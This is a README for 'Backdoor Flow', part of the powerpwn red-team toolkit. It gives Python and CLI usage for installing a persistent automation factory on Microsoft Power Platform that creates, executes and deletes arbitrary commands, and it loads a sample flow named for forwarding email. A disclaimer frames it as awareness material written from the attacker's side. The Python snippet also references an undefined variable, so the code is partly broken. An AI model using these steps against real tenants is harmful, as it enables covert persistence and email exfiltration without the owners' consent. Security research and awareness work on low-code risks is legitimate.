# Backdoor Flow

[![stars](https://img.shields.io/github/stars/mbrg?icon=github&style=social)](https://github.com/mbrg)
[![twitter](https://img.shields.io/twitter/follow/mbrg0?icon=twitter&style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=mbrg0)
[![email me](https://img.shields.io/badge/michael.bargury-owasp.org-red?logo=Gmail)](mailto:michael.bargury@owasp.org)

Backdoor Flow is a demo showing how to maintain persistency on Power Platform by installing an automation factory that creates, executes and deletes arbitrary commands.

<a href="https://powerautomate.microsoft.com/en-us/robotic-process-automation/"><img src="https://docs.microsoft.com/en-us/power-pages/media/overview/power-platform.png" alt="Power Pwn" width="500" height="250" /></a>

Disclaimer: these materials are presented from an attacker’s perspective with the goal of raising awareness to the risks of underestimating the security impact of No Code/Low Code. No Code/Low Code is awesome.

## Usage
**As a python package**

```python
from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
from powerpwn.powerdoor.samples.forward_email_backdoor_flow import SAMPLE_FLOW
POST_URL = ""
factory = BackdoorFlow(post_url=POST_URL)

flow = factory.create_flow(
    environment_id=SAMPLE_FLOW["environment"], 
    flow_display_name=SAMPLE_FLOW["flowDisplayName"], 
    flow_definition=SAMPLE_FLOW["flowDefinition"], 
    flow_state=SAMPLE_FLOW["flowState"], 
    connection_references=EXAMPLE["connectionReferences"]
)

factory.delete_flow(environment_id=SAMPLE_FLOW["environment"], flow_id=flow["name"])
```

**From powerpwn cli**
* Run `powerpwn exec --help` to get all available commands.
* To create flow run `powerpwn exec create-flow -e {environment-id} -webhook-url {url to installed factory} -i {full path to input}`
	* You can find an example to input file in samples/sample_backdoor_flow_cli_input.json
